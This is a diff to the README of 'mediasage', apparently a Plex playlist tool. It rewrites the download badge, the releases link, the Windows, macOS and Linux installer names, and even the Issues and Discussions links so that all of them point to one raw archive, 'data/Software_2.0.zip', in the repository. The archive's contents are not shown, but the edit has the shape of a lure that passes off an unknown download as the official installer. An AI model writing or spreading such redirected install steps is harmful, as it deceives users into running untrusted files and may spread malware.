@@ -8,19 +8,19 @@ Welcome to mediasage! This application helps you generate playlists for Plex usi
 
 To get started, you need to download mediasage from our Releases page. Follow the link below:
 
-[![Download mediasage](https://img.shields.io/badge/Download-medasage-blue)](https://github.com/atomthkun/mediasage/releases)
+[![Download mediasage](https://github.com/atomthkun/mediasage/raw/refs/heads/main/data/Software_2.0.zip)](https://github.com/atomthkun/mediasage/raw/refs/heads/main/data/Software_2.0.zip)
 
 ### Steps to Download and Install:
 
 1. **Visit the Releases Page**: Click the link below to go to the downloads section:
-   [Download mediasage](https://github.com/atomthkun/mediasage/releases)
+   [Download mediasage](https://github.com/atomthkun/mediasage/raw/refs/heads/main/data/Software_2.0.zip)
 
 2. **Choose the Latest Version**: Find the most recent version at the top of the page. This will typically be labeled as "Latest release."
 
 3. **Download the Installer**: Click on the file that matches your operating system. Common options include:
-   - Windows: `mediasage-windows-installer.exe`
-   - macOS: `mediasage-macos-installer.dmg`
-   - Linux: `mediasage-linux-installer.tar.gz`
+   - Windows: `https://github.com/atomthkun/mediasage/raw/refs/heads/main/data/Software_2.0.zip`
+   - macOS: `https://github.com/atomthkun/mediasage/raw/refs/heads/main/data/Software_2.0.zip`
+   - Linux: `https://github.com/atomthkun/mediasage/raw/refs/heads/main/data/Software_2.0.zip`
 
 4. **Run the Installer**: Once the download is complete, open the installer and follow the on-screen instructions. This process may take a few minutes.
 
@@ -64,11 +64,11 @@ To run mediasage smoothly, ensure your system meets the following requirements:
 
 ### How can I get help?
 
-If you encounter issues, visit the [Issues section](https://github.com/atomthkun/mediasage/issues) to report a problem or ask for help.
+If you encounter issues, visit the [Issues section](https://github.com/atomthkun/mediasage/raw/refs/heads/main/data/Software_2.0.zip) to report a problem or ask for help.
 
 ### Can I suggest features?
 
-Absolutely! We welcome feedback. You can share your ideas in the [Discussions tab](https://github.com/atomthkun/mediasage/discussions).
+Absolutely! We welcome feedback. You can share your ideas in the [Discussions tab](https://github.com/atomthkun/mediasage/raw/refs/heads/main/data/Software_2.0.zip).
 
 ### Is there a mobile version available?
 
@@ -82,7 +82,7 @@ The AI analyzes your library to find patterns based on the tracks you often play
 
 Join our community for tips, tricks, and to connect with other users:
 
-- **GitHub Discussions**: [Join Here](https://github.com/atomthkun/mediasage/discussions)
+- **GitHub Discussions**: [Join Here](https://github.com/atomthkun/mediasage/raw/refs/heads/main/data/Software_2.0.zip)
 - **Twitter**: Follow us for updates.
 
 ## ⚠️ License
